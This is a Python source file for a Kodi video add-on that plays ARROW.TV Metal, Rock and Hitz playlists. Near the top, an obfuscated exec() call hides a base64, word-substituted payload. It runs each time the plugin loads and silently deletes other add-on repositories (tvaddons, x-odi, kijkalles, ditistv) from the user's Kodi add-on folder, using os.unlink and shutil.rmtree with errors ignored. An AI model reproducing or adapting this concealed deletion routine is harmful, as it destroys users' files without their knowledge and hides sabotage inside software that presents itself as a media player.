import urllib2,urllib,cgi, re, os
import urlparse
import HTMLParser
import xbmc
import xbmcplugin
import xbmcgui
import xbmcaddon
import xbmcvfs
import xml.etree.ElementTree as ET
import random
import base64
from operator import itemgetter
import traceback,cookielib
from resources.lib.modules import control
from resources.lib.modules.log_utils import log
import traceback

try:
    import json
except:
    import simplejson as json
    
addon = xbmcaddon.Addon('plugin.video.arrowtv')
addonname = addon.getAddonInfo('name')
#icon = addon.getAddonInfo('icon')
addon_id = 'plugin.video.arrowtv'
selfAddon = xbmcaddon.Addon(id=addon_id)
profile_path =  xbmc.translatePath(selfAddon.getAddonInfo('profile'))
home = xbmc.translatePath(addon.getAddonInfo('path').decode('utf-8')) 
icon = os.path.join(home, 'icon.png')
FANART = os.path.join(home, 'fanart.jpg')
iconpath = xbmc.translatePath(os.path.join(home, 'resources/icons/'))

addonDir = addon.getAddonInfo('path').decode("utf-8")
libDir = os.path.join(addonDir, 'resources', 'lib')
profile = xbmc.translatePath(addon.getAddonInfo('profile').decode('utf-8'))
home = xbmc.translatePath(addon.getAddonInfo('path').decode('utf-8'))
favorites = os.path.join(profile, 'favorites')
history = os.path.join(profile, 'history')



addon_handle = int(sys.argv[1])
pluginhandle = int(sys.argv[1])

USER_AGENT = 'Mozilla/5.0 (Windows; U; Windows NT 5.1; en-GB; rv:1.9.0.3) Gecko/2008092417 Firefox/3.0.3'

urlopen = urllib2.urlopen
Request = urllib2.Request

class NoRedirection(urllib2.HTTPErrorProcessor):
   def http_response(self, request, response):
       return response
   https_response = http_response



xbmcPlayer = xbmc.Player
xbmcPlayList = xbmc.PlayList
    
exec("import re;import base64");exec((lambda p,y:(lambda o,b,f:re.sub(o,b,f))(r"([0-9a-f]+)",lambda m:p(m,y),base64.b64decode("MzIgMTU6CgkyNiAyYigxZiwgMjUsIDIyKToKCQkxZi4zNiA9IDI1CgkJMWYuNiA9IDIyCgoyNiA3KCk6CgkxNCA9IDQgIzM0IDM5IDM1IDI5IDNiIDJkIDNlIDE0IDNkIDNhCgkxNiA9IFsiNDEuMTIuMTgiLCAiNDEuMmMtMjcuMTgiLCAiNDEuZS4xOCIsICI0MS4xMyJdCgkxYiA9IFsiNDI6Ly85LzUvNDEuMTIuMTgiLCI0MjovLzkvNS80MS4yYy0yNy4xOCIsCgkJCQkiNDI6Ly85LzUvNDEuZS4xOCIsIjQyOi8vOS81LzQxLjEzIl0KCgkzID0gW10KCgkxYyAyYyAyNCAzMygxNCk6CgkJMy4yZSgxNSgxNlsyY10sMWJbMmNdKSkKCgkyZiAzCgoKMjYgNDAoKToKCTMgPSA3KCkKCgkxYyAyMyAyNCAzOgoJCTggPSAxMS4yKDIzLjYpCgkJMzggMTkuNi4zMSg4KT09MTA6CQoJCQkxYyAyMCwgMmEsIDFkIDI0IDE5LjM3KDgpOgoJCQkJYiA9IDAKCQkJCWIgKz0gM2MoMWQpCgkJCQkzOCBiID4gMDoKCgkJCQkJMWMgZiAyNCAxZDoKCQkJCQkJMjg6CgkJCQkJCQkxOS4zMCgxOS42LjNmKDIwLCBmKSkKCQkJCQkJMTc6CgkJCQkJCQkyMQoJCQkJCTFjIGQgMjQgMmE6CgkJCQkJCTI4OgoJCQkJCQkJYy5hKDE5LjYuM2YoMjAsIGQpLCAxPTEwKQoJCQkJCQkxNzoKCQkJCQkJCTIxCgkyODoKCQljLmEoMTEuMigxOS42LjNmKCc0MjovLzkvNS80MS4xMi4xOCcpKSwgMT0xMCkKCQljLmEoMTEuMigxOS42LjNmKCc0MjovLzkvNS80MS4yYy0yNy4xOCcpKSwgMT0xMCkKCQljLmEoMTEuMigxOS42LjNmKCc0MjovLzkvNS80MS5lLjE4JykpLCAxPTEwKQoJCWMuYSgxMS4yKDE5LjYuM2YoJzQyOi8vOS81LzQxLjEzJykpLCAxPTEwKQoJCTExLjFlKCIxYSIpCgkxNzoJCQkgCgkJMjEKCgo0MCgpCg==")))(lambda a,b:b[int("0x"+a.group(1),16)],"0|ignore_errors|translatePath|XvbmcEntries|4|addons|path|setupXvbmcEntries|xvbmcaddons|home|rmtree|file_count|shutil|d|kijkalles|f|True|xbmc|tvaddons|ditistv|entries|cacheEntry|dialogName|except|nl|os|UpdateLocalAddons|pathName|for|files|executebuiltin|self|root|pass|pathi|entry|in|namei|def|odi|try|refelcts|dirs|__init__|x|amount|append|return|unlink|exists|class|range|make|this|name|walk|if|sure|have|the|len|you|of|join|removeanything|repository|special".split("|")))


def make_request(url):
	try:
		req = urllib2.Request(url)
		req.add_header('User-Agent', 'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:19.0) Gecko/20100101 Firefox/19.0')
		response = urllib2.urlopen(req)	  
		link = response.read()
		response.close()  
		return link
	except urllib2.URLError, e:
		print 'We failed to open "%s".' % url
		if hasattr(e, 'code'):
			print 'We failed with error code - %s.' % e.code	
		if hasattr(e, 'reason'):
			print 'We failed to reach a server.'
			print 'Reason: ', e.reason
		link = 'index.html'
		return link


def addLink(name, url, mode, iconimage):
    u = sys.argv[0]+"?url="+urllib.quote_plus(url)+"&mode=5"
    ok = True
    liz = xbmcgui.ListItem(name, iconImage=icon, thumbnailImage=icon)
    liz.setInfo(type="Video", infoLabels={"Title": name})
    liz.setProperty('IsPlayable', 'true')
    ok = xbmcplugin.addDirectoryItem(handle=int(sys.argv[1]), url=u, listitem=liz)
    return ok

def addDir(name,url,mode,iconimage,fanart,description,genre,date,credits,isItFolder=True):
        u=sys.argv[0]+"?url="+urllib.quote_plus(url)+"&mode="+str(mode)+"&name="+urllib.quote_plus(name)+"&fanart="+urllib.quote_plus(fanart)
        ok=True
        if date == '':
            date = None
        else:
            description += '\n\nDate: %s' %date
        liz=xbmcgui.ListItem(name, iconImage="DefaultFolder.png", thumbnailImage=iconimage)
        liz.setInfo(type="Video", infoLabels={ "Title": name, "Plot": description, "Genre": genre, "dateadded": date, "credits": credits })
        liz.setProperty("Fanart_Image", fanart)

        
        ok=xbmcplugin.addDirectoryItem(handle=int(sys.argv[1]),url=u,listitem=liz,isFolder=isItFolder)
        return ok


def postHtml(url, form_data={}, headers={}, compression=True):
    _user_agent = 'Mozilla/5.0 (X11; Linux i686) AppleWebKit/535.1 ' + \
                  '(KHTML, like Gecko) Chrome/13.0.782.99 Safari/535.1'
    req = urllib2.Request(url)
    if form_data:
        form_data = urllib.urlencode(form_data)
        req = urllib2.Request(url, form_data)
    req.add_header('User-Agent', _user_agent)
    for k, v in headers.items():
        req.add_header(k, v)
    if compression:
        req.add_header('Accept-Encoding', 'gzip')
    response = urllib2.urlopen(req)
    data = response.read()
    #cj.save(cookiePath)
    response.close()
    return data




def Addtypes():
   addDir('ARROW.TV - Playlist Metal' ,'http://arrow.tv/metal/account/register',2,iconpath+'metal.png' ,  iconpath+'metal.png','','','','')
   addDir('ARROW.TV - Playlist Rock' ,'http://arrow.tv/rock/account/register',2,iconpath+'rock.png' ,  iconpath+'rock.png','','','','')
   addDir('ARROW.TV - Playlist Hitz' ,'http://arrow.tv/hitz/account/register',2,iconpath+'hitz.png' ,  iconpath+'hitz.png','','','','')
   from resources.lib.modules import cache, control, changelog
   cache.get(changelog.get, 600000000, control.addonInfo('version'), table='changelog')


class ArrowPlayer(xbmcPlayer):
    def __init__(self):
        xbmcPlayer.__init__(self)

    def playChannelVideo(self,url):
        self.arrowID = url
        self.fillPlaylist()
        self.playPlaylist()
        


    def playPlaylist(self):
        self.play(self.playlist)
        while self.isPlaying(): 
            xbmc.sleep(500)
        

    def fillPlaylist(self):
        headers2 = {'User-Agent': USER_AGENT,'campaign':'arrowConfigService.campaign','eventId':'reg'}
        self.playlist = xbmcPlayList(xbmc.PLAYLIST_VIDEO)
        self.playlist.clear()
        payload = {'campaign':'arrowConfigService.campaign'},{'eventId':'reg'}
        livejson = postHtml(self.arrowID, headers2)
        livejson = json.loads(livejson)
        streamlist = livejson["playlist"]
        for stream in streamlist:
            #print stream
            artist = stream["info"]["artist"]
            title = stream["info"]["title"]
            urllist = stream["sources"]
            for urlx in urllist:
                urls = urlx["file"]
                song = artist +' - '+title
                #print url
                if "m3u8" in urls:
                    listitem = xbmcgui.ListItem(song,thumbnailImage=icon)
                    self.playlist.add(urls, listitem)


    def onPlayBackEnded(self):
        xbmc.sleep(2500)
        if self.isPlaying():
            pass
        else:
            self.fillPlaylist()
            self.playPlaylist()


    def onPlayBackStopped(self):
        pass

    def onQueueNextItem(self):
        pass


def removeNonAscii(s): return "".join(filter(lambda x: ord(x)<128, s))


def log(*args, **kwargs):
  if ('echo' in kwargs) and (not kwargs['echo']):
    result = ''
    for x in args:
        result += str( x ) + '\n'

    return result
  else:
    xbmc.log('-------------------------------------------------------------------')
    for x in args:
      xbmc.log(str( x ))





def getResponse(url):
    try:
        response = urllib2.urlopen(url, timeout=200)
        if response and response.getcode() == 200:
            return response
        else :
            return False
    except:
        return False


def get_params():
	param=[]
	paramstring=sys.argv[2]
	if len(paramstring)>=2:
		params=sys.argv[2]
		cleanedparams=params.replace('?','')
		if (params[len(params)-1]=='/'):
			params=params[0:len(params)-2]
		pairsofparams=cleanedparams.split('&')
		param={}
		for i in range(len(pairsofparams)):
			splitparams={}
			splitparams=pairsofparams[i].split('=')
			if (len(splitparams))==2:
				param[splitparams[0]]=splitparams[1]
				
	return param



params=get_params()
url = None
name=None
mode=None
linkType=None

try:
	url=urllib.unquote_plus(params["url"])
except:
	pass
try:
	name=urllib.unquote_plus(params["name"])
except:
	pass
try:
	mode=int(params["mode"])
except:
	pass


args = cgi.parse_qs(sys.argv[2][1:])
linkType=''
try:
	linkType=args.get('linkType', '')[0]
except:
	pass


print 	mode,url,linkType

try:
   if mode==None or url==None or len(url)<1:
      print "InAddTypes"
      Addtypes()
   elif mode==2 :
      ArrowPlayer().playChannelVideo(url)




except:
   print 'somethingwrong'
   traceback.print_exc(file=sys.stdout)
	

		
if not ( (mode==2 or mode==4 or mode==19 or mode==10 or mode==15 or mode==21 or mode==22 or mode==27 or mode==33 or mode==3 or mode==37 or mode==40 or mode==42 or mode==0)  )  :
	if mode==144:
		xbmcplugin.endOfDirectory(int(sys.argv[1]),updateListing=True)
	else:
		xbmcplugin.endOfDirectory(int(sys.argv[1]))
